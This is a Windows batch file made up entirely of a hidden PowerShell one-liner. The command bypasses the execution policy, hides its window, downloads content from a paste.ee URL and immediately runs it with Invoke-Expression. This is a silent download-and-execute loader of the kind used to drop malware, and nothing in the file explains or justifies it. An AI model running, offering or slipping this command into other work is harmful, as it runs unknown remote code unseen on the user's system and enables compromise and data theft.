@echo off

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^

"Invoke-Expression (Invoke-WebRequest -Uri 'https://paste.ee/r/bdEls24G').Content"
